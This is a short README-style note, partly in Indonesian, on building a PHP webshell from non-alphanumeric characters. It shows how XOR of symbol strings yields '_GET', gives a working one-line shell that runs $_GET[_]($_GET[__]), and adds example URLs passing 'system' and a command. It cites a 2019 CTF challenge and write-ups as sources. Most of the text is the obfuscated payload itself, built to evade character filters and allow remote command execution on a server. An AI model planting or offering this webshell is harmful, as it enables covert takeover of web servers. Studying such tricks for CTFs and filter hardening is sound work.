# Webshell Without Alphanumeric
PHP without alphanumeric construction Webshell

```
$_="`{{{"^"?<>/"; adalah $_="_GET"
${$_}[$_] adalah $_GET['_GET']
(${$_}[_._._._]) adalah $_GET['____']
```
Simple nya akan menjadi `<?php $_GET['_GET']( $_GET['____']);`

https://site.com/shell.php?_GET=system&____=command

```
<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
// $_GET[_]($_GET[__]);

```
https://site.com/shell2.php?_=system&__=command

# Refrensi 
1. Soal CTF cyberjawara 2019
2. http://programmersought.com/article/7881105401/
3. https://github.com/RevID-CTF/CTF/blob/master/CJ_R.O.P.pdf
4. https://gist.github.com/mvisat/03592a5ab0743cd43c2aa65bf45fef21
